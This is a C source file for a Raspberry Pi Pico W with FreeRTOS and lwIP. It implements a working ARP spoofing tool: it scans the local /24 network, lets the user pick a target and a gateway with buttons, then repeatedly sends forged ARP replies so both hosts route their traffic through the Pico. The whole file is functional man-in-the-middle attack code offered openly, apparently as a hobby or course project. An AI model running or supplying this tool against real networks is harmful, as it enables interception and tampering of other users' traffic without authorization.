//TH 
#include <stdio.h>
#include "pico/cyw43_arch.h"
#include "pico/stdlib.h"
#include "FreeRTOS.h"
#include "task.h"
#include "ping.h"
#include "hardware/gpio.h"
#include "lwip/inet.h" 
#include "lwip/ip4_addr.h"
#include "lwip/ethip6.h"
#include "lwip/etharp.h"
#include "lwip/raw.h"
#include "lwip/ip.h"
#include "lwip/pbuf.h"
#include "lwip/udp.h"
#include "lwip/tcp.h"

// Define the Ethernet ethertype for ARP.
#define ARP_PROTOCOL 0x0806

// These can be removed, but I'm leaving it in in case I need to ping something.
#ifndef PING_ADDR
#define PING_ADDR "192.168.19.240"
#endif

#ifndef RUN_FREERTOS_ON_CORE
#define RUN_FREERTOS_ON_CORE 0
#endif

#define TEST_TASK_PRIORITY (tskIDLE_PRIORITY + 1UL)

// Define GPIO pins for buttons.
#define BUTTON_UP_PIN 20
#define BUTTON_DOWN_PIN 21
#define BUTTON_SELECT_PIN 22

int selectedEntry = 0;

// Structure to store IP and MAC addresses.
struct EntryInfo {
    ip4_addr_t ipaddr;
    struct eth_addr ethaddr;
};

// Arrays to store targetEntry and targetGateway info.
struct EntryInfo targetEntryInfo;
struct EntryInfo targetGatewayInfo;

// Callback function when a button is pressed.
static void button_isr(uint gpio, uint32_t events)
{
    // For some reason having 2 ISR didn't work, so sticking to one with an If and else if to use the buttons.
    if (gpio == BUTTON_UP_PIN)
    {
        selectedEntry++;
    }
    else if (gpio == BUTTON_DOWN_PIN)
    {
        selectedEntry--;
    }
}
// The function to connect to the WIFI network selected.
void connectWIFI()
{
    if (cyw43_arch_init()) 
    {
        printf("** Failed to initialize **\n");
        return;
    }
    
    cyw43_arch_enable_sta_mode();
    
    printf("Connecting to Wi-Fi...\n");
    
    // While loop to infinitely try to reconnect to the selected WIFI every 15 seconds.
    while (cyw43_arch_wifi_connect_timeout_ms(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK, 15000)) 
    {
        // Failed to connect, retry after a delay.
        printf("Failed to connect. Retrying in 15 seconds...\n");
        vTaskDelay(15000 / portTICK_PERIOD_MS);
    }

    printf("Connected.\n");
}

// Function to select an entry
int selectEntry(struct netif *netif, int arpEntries, int prevChoice) 
{
    int prevEntry = prevChoice;
    int chosenEntry = -1;
    
    // An array to track selected entries.
    int selectedEntries[arpEntries];
    
    int selectedCount = 0;
    ip4_addr_t *ipaddr;
    struct eth_addr *ethaddr;

    sleep_ms(1000);

    if (prevChoice != -1)
    {
        if (prevChoice != 0)
        {
            --selectedEntry;
        }
        else
        {
            ++selectedEntry;
        }
    }

    // Mostly code for selecting a target and the gateway, along with validation to ensure they don't select the same ones.
    while (1) 
    {
        // Ensure the selected entry is within the valid range.
        if (selectedEntry < 0) 
        {
            selectedEntry = arpEntries - 1;
        } 
        else if (selectedEntry >= arpEntries) 
        {
            selectedEntry = 0;
        }

        // Check if the selection has changed.
        if (selectedEntry != prevEntry && selectedEntry != prevChoice) 
        {
            if (etharp_get_entry(selectedEntry, &ipaddr, &netif, &ethaddr)) 
            {
                printf("-> Entry %d: IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X <-\n",
                       selectedEntry, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                       ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
            }
            prevEntry = selectedEntry;
        }
        else
        {
            selectedEntry = prevEntry;
        }

        // Check if the Select button has been pressed.
        if (gpio_get(BUTTON_SELECT_PIN) == 0) 
        {
            // Check if the selected entry has not been selected before.
            int isAlreadySelected = 0;
            for (int i = 0; i < selectedCount; i++) 
            {
                if (selectedEntries[i] == selectedEntry) 
                {
                    isAlreadySelected = 1;
                    break;
                }
            }
            if (!isAlreadySelected) 
            {
                // Add the selected entry to the selectedEntries array.
                selectedEntries[selectedCount] = selectedEntry;
                selectedCount++;

                chosenEntry = selectedEntry;
                return chosenEntry;
            }
        }
        vTaskDelay(25);
    }
    return -1;
}

// Modified function from etharp's default library.
/* Parameters:
* netif – the lwip network interface on which to send the ARP packet (Just use the default one, &cyw43_state.netif[0])
* ethsrc_addr – the source MAC address for the ethernet header (Put your own MAC here)
* ethdst_addr – the destination MAC address for the ethernet header (Put the target MAC here)
* hwsrc_addr – the source MAC address for the ARP protocol header (Put your own MAC here)
* ipsrc_addr – the source IP address for the ARP protocol header (Put your spoofed IP here)
* hwdst_addr – the destination MAC address for the ARP protocol header
* ipdst_addr – the destination IP address for the ARP protocol header
*/
void send_arp_reply(struct netif *netif, const struct eth_addr *ethsrc_addr,
                    const struct eth_addr *ethdst_addr, const struct eth_addr *hwsrc_addr,
                    const ip4_addr_t *ipsrc_addr, const struct eth_addr *hwdst_addr,
                    const ip4_addr_t *ipdst_addr) 
{
    err_t err = etharp_reply(netif, ethsrc_addr, ethdst_addr, hwsrc_addr, ipsrc_addr, hwdst_addr, ipdst_addr);
    if (err != ERR_OK) 
    {
        printf("Failed to send ARP reply.\n");
    }
}

// Main function.
void main_task(__unused void *params) 
{
    connectWIFI();

    // Get the device's IP address.
    struct netif* netif = &cyw43_state.netif[0];
    ip_addr_t ip = netif->ip_addr;

    // Set device_mac using the MAC address of the netif.
    struct eth_addr device_mac;
    SMEMCPY(&device_mac, netif->hwaddr, ETH_HWADDR_LEN);

    // Get the first three octets from the device's IP address for the network scan later.
    uint8_t octet1 = ip4_addr1_16(&ip);
    uint8_t octet2 = ip4_addr2_16(&ip);
    uint8_t octet3 = ip4_addr3_16(&ip);
    
    int arpEntries = 0;
    int targetEntry = -1;
    int targetGateway = -1;

    size_t entry_index;
    ip4_addr_t *ipaddr;
    
    struct eth_addr *ethaddr;

    // Printing out the device information like IP and MAC address.
    printf("\nDevice IP: %u.%u.%u.%u\n", octet1, octet2, octet3, ip4_addr4_16(&ip));
    printf("Device MAC: %02X:%02X:%02X:%02X:%02X:%02X\n\n", device_mac.addr[0], device_mac.addr[1], 
    device_mac.addr[2], device_mac.addr[3], device_mac.addr[4], device_mac.addr[5]);    

    // Scanning the network the device is on, assuming that the subnet mask is /24.
    printf("Scanning the network...\n");
    
    for (int i = 0; i <=255; i++) 
    {
        ip_addr_t target_ip;
        uint8_t octet4 = i & 0xFF;
        IP4_ADDR(ip_2_ip4(&target_ip), octet1, octet2, octet3, octet4);

        // Preparing the ARP request.
        etharp_request(&cyw43_state.netif[0], &target_ip);

        // Slight delay to not flood traffic.
        vTaskDelay(25 / portTICK_PERIOD_MS);
    }

    // Prints out all ARP table entries received from devices on the network.
    for (entry_index = 0; entry_index <= ARP_TABLE_SIZE; entry_index++) 
    {
        if (etharp_get_entry(entry_index, &ipaddr, &netif, &ethaddr)) 
        {
            // Print or use the information from the ARP table entry.
            printf("Entry %d: IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                entry_index, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
            arpEntries++;
        }
    }   

    // Enable the GPIO pins for interrupt generation on the falling edge.
    gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);   
    gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);

    // Selecting a target.
    printf("\nSelect the Target: Press 'Up'(20) and 'Down'(21) buttons to select an entry. Press 'Select'(22) to confirm.\n");
    targetEntry = selectEntry(netif, arpEntries, targetEntry);

    if (targetEntry >= 0) 
    {
        if (etharp_get_entry(targetEntry, &ipaddr, &netif, &ethaddr)) 
        {
            printf("Selected Target: Entry %d, IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                targetEntry, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
             // Store the selected IP and MAC address in the targetEntryInfo structure
            targetEntryInfo.ipaddr = *ipaddr;
            SMEMCPY(&targetEntryInfo.ethaddr, &ethaddr, ETH_HWADDR_LEN);
        }
    } 
    else 
    {
        printf("Selection canceled or invalid.\n");
    }

    // Selecting a gateway.
    printf("\nSelect the Gateway: Press 'Up'(20) and 'Down'(21) buttons to select an entry. Press 'Select'(22) to confirm.\n");
    targetGateway = selectEntry(netif, arpEntries, targetEntry);
        
    if (targetGateway >= 0) 
    {
        if (etharp_get_entry(targetGateway, &ipaddr, &netif, &ethaddr)) 
        {
            printf("Selected Gateway: Entry %d, IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                targetGateway, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
            targetGatewayInfo.ipaddr = *ipaddr;
            SMEMCPY(&targetGatewayInfo.ethaddr, &ethaddr, ETH_HWADDR_LEN);
        }
    } 
    else 
    {
        printf("Selection canceled or invalid.\n");
    }
    // Disabling the buttons.
    gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);   
    gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);


    // Infinite loop when the PICO doesn't receive a 'S' char.
    while(getchar_timeout_us(0) != 'S')
    {
        // If the ARP entry exists, sends a ARP stating that the MAC address of the selected device is actually at the Receiver Pico.
        // This causes the target and gateway to send their traffic to the Receiver instead of each other.

        // Sending the ARP to the target.
        if (etharp_get_entry(targetEntry, &ipaddr, &netif, &ethaddr)) 
        {
            printf("Sending ARP to Target: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                targetEntry, ip4addr_ntoa(ipaddr), ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
            send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, &targetGatewayInfo.ipaddr, &device_mac, &ip);
        }

        // Sending the ARP to the receiver.
        if (etharp_get_entry(targetGateway, &ipaddr, &netif, &ethaddr)) 
        {
            printf("Sending ARP to Gateway: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n\n",
                targetGateway, ip4addr_ntoa(ipaddr), ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
            send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, &targetEntryInfo.ipaddr, &device_mac, &ip);
        }
        printf("Enter 'S' into the serial monitor to stop spoofing.\n");

        // Sleep for 2 seconds to not flood the network.
        sleep_ms(2000);
    }
    cyw43_arch_deinit();
}

void vLaunch( void) {
    TaskHandle_t task;
    xTaskCreate(main_task, "TestMainThread", configMINIMAL_STACK_SIZE, NULL, TEST_TASK_PRIORITY, &task);

#if NO_SYS && configUSE_CORE_AFFINITY && configNUM_CORES > 1
    // we must bind the main task to one core (well at least while the init is called)
    // (note we only do this in NO_SYS mode because cyw43_arch_freertos
    // takes care of it otherwise)
    vTaskCoreAffinitySet(task, 1);
#endif

    /* Start the tasks and timer running. */
    vTaskStartScheduler();
}

int main( void )
{
    stdio_init_all();
    gpio_init(BUTTON_UP_PIN);
    gpio_init(BUTTON_DOWN_PIN);
    gpio_init(BUTTON_SELECT_PIN);

    // Set the button pins as inputs
    gpio_set_dir(BUTTON_UP_PIN, GPIO_IN);
    gpio_set_dir(BUTTON_DOWN_PIN, GPIO_IN);
    gpio_set_dir(BUTTON_SELECT_PIN, GPIO_IN);

    /* Configure the hardware ready to run the demo. */
    const char *rtos_name;
#if ( portSUPPORT_SMP == 1 )
    rtos_name = "FreeRTOS SMP";
#else
    rtos_name = "FreeRTOS";
#endif

#if ( portSUPPORT_SMP == 1 ) && ( configNUM_CORES == 2 )
    printf("Starting %s on both cores:\n", rtos_name);
    vLaunch();
#elif ( RUN_FREERTOS_ON_CORE == 1 )
    printf("Starting %s on core 1:\n", rtos_name);
    multicore_launch_core1(vLaunch);
    while (true);
#else
    printf("Starting %s on core 0:\n", rtos_name);
    vLaunch();
#endif
    return 0;
}
